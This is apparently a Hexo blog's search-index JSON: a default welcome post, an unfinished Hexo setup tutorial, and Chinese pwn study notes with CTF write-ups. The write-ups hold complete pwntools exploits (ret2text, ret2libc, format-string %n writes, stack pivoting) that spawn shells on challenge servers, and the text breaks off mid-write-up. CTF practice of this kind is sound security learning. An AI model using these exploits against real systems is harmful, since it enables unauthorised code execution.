[{"title":"Hello World","url":"/2024/11/12/hello-world/","content":"<p>Welcome to <a href=\"https://hexo.io/\">Hexo</a>! This is your very first post. Check <a href=\"https://hexo.io/docs/\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\">GitHub</a>.</p>\n<span id=\"more\"></span>\n\n<h2 id=\"Quick-Start\"><a href=\"#Quick-Start\" class=\"headerlink\" title=\"Quick Start\"></a>Quick Start</h2><h3 id=\"Create-a-new-post\"><a href=\"#Create-a-new-post\" class=\"headerlink\" title=\"Create a new post\"></a>Create a new post</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/writing.html\">Writing</a></p>\n<h3 id=\"Run-server\"><a href=\"#Run-server\" class=\"headerlink\" title=\"Run server\"></a>Run server</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/server.html\">Server</a></p>\n<h3 id=\"Generate-static-files\"><a href=\"#Generate-static-files\" class=\"headerlink\" title=\"Generate static files\"></a>Generate static files</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/generating.html\">Generating</a></p>\n<h3 id=\"Deploy-to-remote-sites\"><a href=\"#Deploy-to-remote-sites\" class=\"headerlink\" title=\"Deploy to remote sites\"></a>Deploy to remote sites</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/one-command-deployment.html\">Deployment</a></p>\n"},{"title":"Hexo博客搭建教程（施工中）","url":"/2024/11/19/hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/","content":"<h1 id=\"Hexo搭建步骤\"><a href=\"#Hexo搭建步骤\" class=\"headerlink\" title=\"Hexo搭建步骤\"></a>Hexo搭建步骤</h1><ol>\n<li><p>安装Git</p>\n</li>\n<li><p>安装Node.js</p>\n</li>\n<li><p>安装Hexo</p>\n</li>\n<li><p>GitHub创建个人仓库</p>\n</li>\n<li><p>生成SSH添加到GitHub</p>\n</li>\n<li><p>将hexo部署到GitHub</p>\n</li>\n<li><p>设置个人域名</p>\n</li>\n<li><p>发布文章</p>\n<span id=\"more\"></span></li>\n</ol>\n<h2 id=\"1-安装Git\"><a href=\"#1-安装Git\" class=\"headerlink\" title=\"1.安装Git\"></a>1.安装Git</h2><p>Git是目前世界上最先进的分布式版本控制系统，可以有效、高速的处理从很小到非常大的项目版本管理。也就是用来管理你的hexo博客文章，上传到GitHub的工具。Git非常强大，我觉得建议每个人都去了解一下。廖雪峰老师的Git教程写的非常好，大家可以了解一下。Git教程</p>\n<p>windows：到git官网上下载,<a href=\"https://gitforwindows.org/\">(Git for Windows)</a>下载后会有一个Git Bash的命令行工具，以后就用这个工具来使用git。</p>\n<p>linux：对linux来说实在是太简单了，因为最早的git就是在linux上编写的，只需要一行代码</p>\n<p><code>sudo apt-get install git</code><br>安装好后，用git –version 来查看一下版本</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/jz5p/pic/202411192120575.png\" alt=\"image-20241119212052457\"></p>\n<h2 id=\"2-安装Node-js\"><a href=\"#2-安装Node-js\" class=\"headerlink\" title=\"2.安装Node.js\"></a>2.安装Node.js</h2><p>Hexo是基于nodeJS编写的，所以需要安装一下nodeJs和里面的npm工具。</p>\n<p>windows：nodejs选择LTS版本就行了。</p>\n<p>linux：</p>\n<p><code>sudo apt-get install nodejs</code><br><code>sudo apt-get install npm</code></p>\n<p>安装完后，打开命令行</p>\n<p><code>node -v</code><br><code>npm -v</code><br>检查一下有没有安装成功</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/jz5p/pic/202411192131259.png\" alt=\"image-20241119213117229\"></p>\n<h2 id=\"3-安装hexo\"><a href=\"#3-安装hexo\" class=\"headerlink\" title=\"3.安装hexo\"></a>3.安装hexo</h2>","categories":["other"],"tags":["教程"]},{"title":"pwn学习笔记","url":"/2024/11/19/pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","content":"<h2 id=\"知识点\"><a href=\"#知识点\" class=\"headerlink\" title=\"知识点\"></a>知识点</h2><span id=\"more\"></span>\n\n<h3 id=\"栈\"><a href=\"#栈\" class=\"headerlink\" title=\"栈\"></a>栈</h3><p>栈是一种数据结构，遵循后进先出的原则(Last in First Out)，主要有压栈（push）与出栈（pop）两种操作</p>\n<p>eax, ebx, ecx, edx, esi, edi, ebp, esp等都是X86 汇编语言中CPU上的通用寄存器的名称，是32位的寄存器。如果用C语言来解释，可以把这些寄存器当作变量看待。</p>\n<p>在栈中，esp保存栈帧的栈顶地址，ebp保存栈帧的栈底地址</p>\n<p><strong>程序的栈是从进程地址空间的高地址向低地址增长的</strong></p>\n<h3 id=\"栈溢出\"><a href=\"#栈溢出\" class=\"headerlink\" title=\"栈溢出\"></a>栈溢出</h3><p>栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。</p>\n<p>栈溢出的前提是：程序向栈上写入数据；数据的长度不受控制</p>\n<p>最简单的栈溢出就是通过溢出，覆盖程序的返回地址，将返回地址覆盖为system(‘&#x2F;bin&#x2F;sh’)的地址</p>\n<h4 id=\"ret2系列\"><a href=\"#ret2系列\" class=\"headerlink\" title=\"ret2系列\"></a>ret2系列</h4><p>通过栈溢出覆盖ebp从而改写返回值，让程序返回到后门函数从而getshell.</p>\n<h3 id=\"栈迁移\"><a href=\"#栈迁移\" class=\"headerlink\" title=\"栈迁移\"></a>栈迁移</h3><p>栈迁移相当于控制程序执行的控制流，通过修改ebp的值和执行两次leave;ret指令来修改eip。一般在栈溢出长度不够写下完整payload时使用。</p>\n<p>使用的条件是能够泄露ebp且溢出长度至少能够覆盖ebp。</p>\n<h4 id=\"原理：\"><a href=\"#原理：\" class=\"headerlink\" title=\"原理：\"></a>原理：</h4><p>payload：overflow + target_addr + leave_ret_addr</p>\n<p>leave和ret指令的本质如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">leave:\tmov esp,ebp;</span><br><span class=\"line\">      \tpop ebp;</span><br><span class=\"line\"></span><br><span class=\"line\">ret:\tpop eip;</span><br></pre></td></tr></table></figure>\n\n<p>修改完ebp的值为目标地址后，运行到函数结尾第一次执行leave指令，实现将ebp弹到目标地址，然后执行第一次ret指令，由于我们将返回地址修改为了leave_ret的地址，所以第一次ret指令会返回到leave_ret处执行第二次，而第二次leave指令，mov esp,ebp后esp也被弹到了目标地址，而pop ebp后esp指向了下一个内存单元。最后ret指令使esp的内容进入了eip。所以只要让第二次leave后的esp指向我们的后门函数即可成功执行后门函数。</p>\n<h3 id=\"格式化字符串漏洞\"><a href=\"#格式化字符串漏洞\" class=\"headerlink\" title=\"格式化字符串漏洞\"></a>格式化字符串漏洞</h3><h4 id=\"实现原理：\"><a href=\"#实现原理：\" class=\"headerlink\" title=\"实现原理：\"></a>实现原理：</h4><p>利用printf函数的格式化字符串%n实现对内存的改写。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&#x27;xxxx%n&#x27;</span>,p) <span class=\"comment\">//将%n之前的字符串的长度赋值给指针p</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"利用方法：\"><a href=\"#利用方法：\" class=\"headerlink\" title=\"利用方法：\"></a>利用方法：</h4><p>出现printf(输入)的情况下，首先通过格式化字符串“%x”来找到输入在栈上的位置，然后输入需要改变的内存的地址和%x$n来改变需要更改的内存的值（x是输入在栈上的位置）。</p>\n<h2 id=\"做题记录\"><a href=\"#做题记录\" class=\"headerlink\" title=\"做题记录\"></a>做题记录</h2><h3 id=\"ret2text\"><a href=\"#ret2text\" class=\"headerlink\" title=\"ret2text\"></a>ret2text</h3><h4 id=\"buu-bjdctf-2020-babystack\"><a href=\"#buu-bjdctf-2020-babystack\" class=\"headerlink\" title=\"[buu]bjdctf_2020_babystack\"></a>[buu]bjdctf_2020_babystack</h4><p><img src=\"https://cdn.jsdelivr.net/gh/jz5p/pic/202411192148538.png\" alt=\"image-20241119214836507\"></p>\n<p>使用scanf输入的长度，且后续read时调用长度时用的是无符号整型，那么read处就可以栈溢出。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/jz5p/pic/202411192153756.png\" alt=\"image-20241119215350733\"></p>\n<p>发现有写好的后门函数来getshell,直接栈溢出让main函数返回到这个函数的地址即可。</p>\n<p>payload:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">sh.sendline(<span class=\"string\">b&#x27;-2&#x27;</span>)</span><br><span class=\"line\">ret = <span class=\"number\">0x4006FA</span></span><br><span class=\"line\">overflow = <span class=\"string\">b&#x27;1&#x27;</span>*(<span class=\"number\">0x10</span>+<span class=\"number\">8</span>)</span><br><span class=\"line\">func = <span class=\"number\">0x4006E6</span></span><br><span class=\"line\">payload = overflow + p64(ret) + p64(func)</span><br><span class=\"line\">sh.sendline(payload)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>然后就成功getshell了。</p>\n<h4 id=\"buu-get-started-3dsctf-2016\"><a href=\"#buu-get-started-3dsctf-2016\" class=\"headerlink\" title=\"[buu]get_started_3dsctf_2016\"></a>[buu]get_started_3dsctf_2016</h4><p><img src=\"https://cdn.jsdelivr.net/gh/jz5p/pic/202411202004408.png\" alt=\"image-20241120200448344\"></p>\n<p>主函数中看到gets函数，可以栈溢出。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/jz5p/pic/202411202005932.png\" alt=\"image-20241120200538896\"></p>\n<p>函数列表中看到了getflag函数，同时这个程序是静态编译的，所以考虑ret2text。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/jz5p/pic/202411202007599.png\" alt=\"image-20241120200707558\"></p>\n<p>需要两个参数都满足if中的条件即可得到flag.</p>\n<p>payload如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">func = <span class=\"number\">0x80489A0</span></span><br><span class=\"line\">ret = <span class=\"number\">0x8048C6E</span></span><br><span class=\"line\">overflow = <span class=\"string\">b&#x27;1&#x27;</span>*(<span class=\"number\">0x38</span>)</span><br><span class=\"line\">payload = overflow + p32(func) + p32(ret) + p32(<span class=\"number\">0x308CD64F</span>) + p32(<span class=\"number\">0x195719D1</span>)</span><br><span class=\"line\">sh.sendline(payload)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(sh.recv())</span><br></pre></td></tr></table></figure>\n\n<p>函数地址与参数之间需要一个返回地址，它可以是0，但是不能不填，否则程序会将参数当作返回地址从而导致getshell失败。此处的地址是动调后得到的main函数运行时的实际返回地址，目的是让程序正常退出。如果填别的会失败。</p>\n<p>溢出的部分没有+4覆盖ebp是因为main函数没有ebp。</p>\n<h3 id=\"ret2libc\"><a href=\"#ret2libc\" class=\"headerlink\" title=\"ret2libc\"></a>ret2libc</h3><h4 id=\"buu-ciscn-2019-c-1\"><a href=\"#buu-ciscn-2019-c-1\" class=\"headerlink\" title=\"[buu]ciscn_2019_c_1\"></a>[buu]ciscn_2019_c_1</h4><p><img src=\"https://cdn.jsdelivr.net/gh/jz5p/pic/202411202035408.png\" alt=\"image-20241120203549373\"></p>\n<p>gets函数可以栈溢出。本题没有能直接调用的system函数，也没有可写可执行的段，故考虑使用ret2libc的方式getshell.</p>\n<p>利用puts泄露libc地址，然后跟libc中的地址计算得出基址，然后在用基址和libc中system的地址调用system函数，从而getshell。</p>\n<p>回到这题，它对输入进行了加密，但是由于使用的是while的结构，在最开始会先ret一次，这个时候就会直接执行我们的payload中想让他执行的内容，所以不用反向加密payload.</p>\n<p>payload:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">file = ELF(<span class=\"string\">&#x27;./elf&#x27;</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class=\"line\">puts_got = file.got[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">puts_plt = file.plt[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">libc_puts = libc.symbols[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">libc_system = libc.symbols[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">shell = libc.search(<span class=\"string\">&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class=\"line\">pop_rdi = <span class=\"number\">0x400c83</span></span><br><span class=\"line\">sh.sendlineafter(<span class=\"string\">&#x27;your choice!\\n&#x27;</span>,<span class=\"string\">b&#x27;1&#x27;</span>)</span><br><span class=\"line\">overflow = <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x58</span></span><br><span class=\"line\">ret = <span class=\"number\">0x400C1C</span></span><br><span class=\"line\">main = <span class=\"number\">0x400B28</span></span><br><span class=\"line\">payload = overflow + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)</span><br><span class=\"line\">sh.sendlineafter(<span class=\"string\">&#x27;to be encrypted\\n&#x27;</span>, payload)</span><br><span class=\"line\">libc_addr = u64(sh.recvuntil(<span class=\"string\">&#x27;\\x7f&#x27;</span>)[-<span class=\"number\">6</span>:].ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">libc_base = libc_addr - libc_puts</span><br><span class=\"line\"><span class=\"comment\">#获取libc基址</span></span><br><span class=\"line\">sh.sendline(<span class=\"string\">b&#x27;1&#x27;</span>)</span><br><span class=\"line\">payload = overflow + p64(ret) + p64(pop_rdi) + p64(shell+libc_base) + p64(libc_system+libc_base)</span><br><span class=\"line\">sh.sendlineafter(<span class=\"string\">&#x27;to be encrypted\\n&#x27;</span>, payload)</span><br><span class=\"line\">sh.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"GeekChallenge2024-买黑马喽了么\"><a href=\"#GeekChallenge2024-买黑马喽了么\" class=\"headerlink\" title=\"[GeekChallenge2024]买黑马喽了么\"></a>[GeekChallenge2024]买黑马喽了么</h4><p><img src=\"https://cdn.jsdelivr.net/gh/jz5p/pic/202411241523352.png\" alt=\"image-20241124152346315\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/jz5p/pic/202411241519434.png\" alt=\"image-20241124151929401\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/jz5p/pic/202411241519308.png\" alt=\"image-20241124151940284\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/jz5p/pic/202411241519866.png\" alt=\"image-20241124151949831\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/jz5p/pic/202411241523496.png\" alt=\"image-20241124152318464\"></p>\n<p>开启了NX保护和随机硬件地址，同时text段中没有可以直接利用的函数，故考虑ret2libc。Write函数处可以栈溢出。由于开启了随机硬件地址，所以还需要获取这个附件本身的基址。</p>\n<p>view函数中else分支处对balance取了地址，同时这里printf的格式化字符串是str1，在上方可以修改，将%x改为%p即可让这个分支输出运行时的balance地址，减去静态地址即可得到基址。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/jz5p/pic/202411241533123.png\" alt=\"image-20241124153353094\"></p>\n<p>修改str1需要让balance的值大于它的初始值，但是操作中并没有能让他增加的部分。注意到判断时balance的类型是无符号整型，可以在shop函数中吧balance的值减少到负数来让这个无符号整型大于256.</p>\n<p>可以得到第一部分exp:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">8</span>):</span><br><span class=\"line\">    sh.sendline(<span class=\"string\">b&#x27;1&#x27;</span>)</span><br><span class=\"line\">    sh.sendline(<span class=\"string\">b&#x27;1&#x27;</span>)</span><br><span class=\"line\">sh.sendline(<span class=\"string\">b&#x27;1\\n&#x27;</span>)</span><br><span class=\"line\">sh.recv()</span><br><span class=\"line\">sh.sendline(<span class=\"string\">b&#x27;2\\n&#x27;</span>)</span><br><span class=\"line\">sh.recv()</span><br><span class=\"line\">sh.sendline(<span class=\"string\">b&#x27;2&#x27;</span>)</span><br><span class=\"line\">sh.sendline(<span class=\"string\">b&#x27;%p&#x27;</span>)</span><br><span class=\"line\">sh.recvuntil(<span class=\"string\">&#x27;Balance : 0x&#x27;</span>)</span><br><span class=\"line\">addr_Balance = <span class=\"built_in\">int</span>(sh.recv(<span class=\"number\">14</span>), <span class=\"number\">16</span>)</span><br><span class=\"line\">base_addr = addr_Balance-<span class=\"number\">0x4090</span></span><br></pre></td></tr></table></figure>\n\n<p>获得程序基址。</p>\n<p>然后就可以利用基址调用程序的puts函数来泄露libc，然后调用libc中的system函数来getshell.</p>\n<p>完整exp:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">sh = remote(<span class=\"string\">&#x27;nc1.ctfplus.cn&#x27;</span>, <span class=\"number\">14874</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./syscall&#x27;</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;./libc.so.6&#x27;</span>)</span><br><span class=\"line\">pop_rdi_ret = <span class=\"number\">0x11f1</span></span><br><span class=\"line\">ret_addr = <span class=\"number\">0x14F8</span></span><br><span class=\"line\">main = <span class=\"number\">0x14F9</span></span><br><span class=\"line\">puts_got = elf.got[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">puts_plt = elf.plt[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">libc_puts = libc.symbols[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">system_addr = libc.symbols[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">shell_addr = libc.search(<span class=\"string\">&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">8</span>):</span><br><span class=\"line\">    sh.sendline(<span class=\"string\">b&#x27;1&#x27;</span>)</span><br><span class=\"line\">    sh.sendline(<span class=\"string\">b&#x27;1&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">sh.sendline(<span class=\"string\">b&#x27;1\\n&#x27;</span>)</span><br><span class=\"line\">sh.recv()</span><br><span class=\"line\">sh.sendline(<span class=\"string\">b&#x27;2\\n&#x27;</span>)</span><br><span class=\"line\">sh.recv()</span><br><span class=\"line\">sh.sendline(<span class=\"string\">b&#x27;2&#x27;</span>)</span><br><span class=\"line\">sh.sendline(<span class=\"string\">b&#x27;%p&#x27;</span>)</span><br><span class=\"line\">sh.recvuntil(<span class=\"string\">&#x27;Balance : 0x&#x27;</span>)</span><br><span class=\"line\">addr_Balance = <span class=\"built_in\">int</span>(sh.recv(<span class=\"number\">14</span>), <span class=\"number\">16</span>)</span><br><span class=\"line\">base_addr = addr_Balance-<span class=\"number\">0x4090</span></span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;1&#x27;</span>*<span class=\"number\">0x58</span>+p64(pop_rdi_ret+base_addr)+p64(puts_got+base_addr)+p64(puts_plt+base_addr)+p64(main+base_addr)</span><br><span class=\"line\">sh.sendline(<span class=\"string\">b&#x27;3&#x27;</span>)</span><br><span class=\"line\">sh.sendline(payload)</span><br><span class=\"line\">addr = u64(sh.recvuntil(<span class=\"string\">&#x27;\\x7f&#x27;</span>)[-<span class=\"number\">6</span>:].ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">base_libc = addr-libc_puts</span><br><span class=\"line\">payload1 = <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x58</span> + p64(ret_addr+base_addr) + p64(pop_rdi_ret+base_addr) + p64(shell_addr+base_libc) + p64(system_addr+base_libc)</span><br><span class=\"line\">sh.sendlineafter(<span class=\"string\">&#x27;your choice:\\n&#x27;</span>, <span class=\"string\">b&#x27;3&#x27;</span>)</span><br><span class=\"line\">sh.sendlineafter(<span class=\"string\">&#x27;feedback:\\n&#x27;</span>, payload1)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"格式化字符串漏洞-1\"><a href=\"#格式化字符串漏洞-1\" class=\"headerlink\" title=\"格式化字符串漏洞\"></a>格式化字符串漏洞</h3><h4 id=\"buu-jarvisoj-fm\"><a href=\"#buu-jarvisoj-fm\" class=\"headerlink\" title=\"[buu]jarvisoj_fm\"></a>[buu]jarvisoj_fm</h4><p><img src=\"https://cdn.jsdelivr.net/gh/jz5p/pic/202411262135755.png\" alt=\"image-20241126213506718\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/jz5p/pic/202411262135330.png\" alt=\"image-20241126213513309\"></p>\n<p>x的值是3，把它变成4就可以getshell。</p>\n<p>第十行的printf处存在格式化字符串漏洞，可以利用。</p>\n<p>构造如下payload得到buf在栈上存储的位置。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">sh.sendline(<span class=\"string\">b&#x27;aaaa  1:%x 2:%x 3:%x 4:%x 5:%x 6:%x 7:%x 8:%x 9:%x 10:%x 1:%x 2:%x 3:%x 4:%x 5:%x 6:%x&#x27;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(sh.recvline())</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>得到如下回显：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">b&#x27;aaaa  1:ff892aec 2:50 3:0 4:f7ffb000 5:f7ffb918 6:ff892af0 7:ff892be4 8:0 9:ff892b84 10:50 1:61616161 2:3a312020 3:32207825 4:2078253a 5:3!\\n&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>可以看到我们的输入在第11个内存空间上。</p>\n<p>构造如下payload:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">x_addr = <span class=\"number\">0x804A02C</span></span><br><span class=\"line\">payload = p32(x_addr) + <span class=\"string\">b&#x27;%11$n&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>原理就是格式化字符串%n可以改写内存的值，%11$n所对应的参数是往后11个内存空间，即我们的输入，也就是x的地址；而x的地址是一个32位的十六进制字符串，转换为unsigned char的话长度是4，从而实现将x的值改成4.</p>\n<p>就能成功getshell了。</p>\n<p>完整exp:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">sh = remote(<span class=\"string\">&#x27;node5.buuoj.cn&#x27;</span>, <span class=\"number\">28045</span>)</span><br><span class=\"line\"><span class=\"comment\"># sh.sendline(b&#x27;aaaa  1:%x 2:%x 3:%x 4:%x 5:%x 6:%x 7:%x 8:%x 9:%x 10:%x 1:%x 2:%x 3:%x 4:%x 5:%x 6:%x&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\"># print(sh.recvline())</span></span><br><span class=\"line\">payload = p32(<span class=\"number\">0x804A02C</span>) + <span class=\"string\">b&#x27;%11$n&#x27;</span></span><br><span class=\"line\">sh.sendline(payload)</span><br><span class=\"line\">sh.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"buu-第五空间2019-决赛-PWN5\"><a href=\"#buu-第五空间2019-决赛-PWN5\" class=\"headerlink\" title=\"[buu] [第五空间2019 决赛]PWN5\"></a>[buu] [第五空间2019 决赛]PWN5</h4><p><img src=\"https://cdn.jsdelivr.net/gh/jz5p/pic/202411262159938.png\" alt=\"image-20241126215948893\"></p>\n<p>程序读取了一个随机数，之后将输入与随机数进行了对比，相同直接getshell.</p>\n<p>对栈进行了检查，如果栈不平衡程序会死掉。第21行存在格式化字符串漏洞。所以考虑利用格式化字符串改变随机数的值。</p>\n<p>首先寻找输入在栈上的位置：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">sh.sendline(<span class=\"string\">b&#x27;aaaa  1:%x 2:%x 3:%x 4:%x 5:%x 6:%x 7:%x 8:%x 9:%x 10:%x 1:%x 2:%x 3:%x 4:%x 5:%x 6:%x&#x27;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(sh.recvline())</span><br><span class=\"line\"><span class=\"comment\">#b&#x27;your name:Hello,aaaa  1:ff804d18 2:63 3:0 4:ff804d3e 5:3 6:c2 7:f7e778fb 8:ff804d3e 9:ff804e3c 10:61616161 1:3a312020 2:32207825 3:2078253a 4:78253a33 5:253a3420 6:3a352078\\n&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>发现在第十个内存空间上。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/jz5p/pic/202411262221494.png\" alt=\"image-20241126222139466\"></p>\n<p>随机数一共32位，所以需要改写4个地址的值。</p>\n<p>构造payload如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">payload = p32(<span class=\"number\">0x804C044</span>) + p32(<span class=\"number\">0x804C045</span>) + p32(<span class=\"number\">0x804C046</span>) + p32(<span class=\"number\">0x804C047</span>) </span><br><span class=\"line\">payload += <span class=\"string\">b&#x27;%10$n%11$n%12$n%13$n&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>这里直接将随机数每一位的值改写成4个十六进制字符串的值，即0x10，最后rand的值被改为了0x10101010.</p>\n<p>完整exp如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">sh = remote(<span class=\"string\">&#x27;node5.buuoj.cn&#x27;</span>, <span class=\"number\">27066</span>)</span><br><span class=\"line\"><span class=\"comment\"># sh.sendline(b&#x27;aaaa  1:%x 2:%x 3:%x 4:%x 5:%x 6:%x 7:%x 8:%x 9:%x 10:%x 1:%x 2:%x 3:%x 4:%x 5:%x 6:%x&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\"># print(sh.recvline())</span></span><br><span class=\"line\">payload = p32(<span class=\"number\">0x804C044</span>) + p32(<span class=\"number\">0x804C045</span>) + p32(<span class=\"number\">0x804C046</span>) + p32(<span class=\"number\">0x804C047</span>) </span><br><span class=\"line\">payload += <span class=\"string\">b&#x27;%10$n%11$n%12$n%13$n&#x27;</span></span><br><span class=\"line\">sh.sendlineafter(<span class=\"string\">&#x27;name:&#x27;</span>,payload)</span><br><span class=\"line\">sh.sendlineafter(<span class=\"string\">&#x27;asswd:&#x27;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">0x10101010</span>))</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"栈迁移-1\"><a href=\"#栈迁移-1\" class=\"headerlink\" title=\"栈迁移\"></a>栈迁移</h3><h4 id=\"buu-ciscn-2019-es-2\"><a href=\"#buu-ciscn-2019-es-2\" class=\"headerlink\" title=\"[buu]ciscn_2019_es_2\"></a>[buu]ciscn_2019_es_2</h4><p><img src=\"https://cdn.jsdelivr.net/gh/jz5p/pic/202412041639799.png\" alt=\"image-20241204163933686\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/jz5p/pic/202412041639648.png\" alt=\"image-20241204163942615\"></p>\n<p>read函数处可以溢出，但是溢出的长度不够写下函数返回地址和参数，故考虑栈迁移。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/jz5p/pic/202412041643807.png\" alt=\"image-20241204164343768\"></p>\n<p>这里能看到疑似后门函数，但是只是echo flag，而且这个字符串存储的rodata段并没有写的权限，所以这个函数无法利用。</p>\n<p>考虑栈迁移具体用法，可以迁移到输入的开头，这样可以在输入的溢出前的部分写下system函数的地址，返回地址，参数，shell的地址和‘&#x2F;bin&#x2F;sh’字符串（程序中没有现成的&#x2F;bin&#x2F;sh）。</p>\n<p>第一步要先泄露ebp。此处输出函数使用的是printf，所以只要把我们的输入和ebp之间的空间填满，printf函数就会把我们的输入跟ebp的内容一起输出。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">overflow1 = <span class=\"string\">b&#x27;1&#x27;</span>*<span class=\"number\">0x28</span></span><br><span class=\"line\">sh.sendafter(<span class=\"string\">b&#x27;name?\\n&#x27;</span>,overflow1)</span><br><span class=\"line\">ebp = u32(sh.recvuntil(<span class=\"string\">b&#x27;\\xff&#x27;</span>)[-<span class=\"number\">4</span>:])</span><br></pre></td></tr></table></figure>\n\n<p>即可得到ebp的内容（不是ebp的地址）</p>\n<p>ebp存放的是一个地址，这个地址到我们输入开头的地址的相对位置是一定的，所以只要动调，计算得到这个偏移值就可以得到我们输入的地址了。</p>\n<p>得到输入地址后将栈迁移到这个地方就可以getshell了。</p>\n<figure 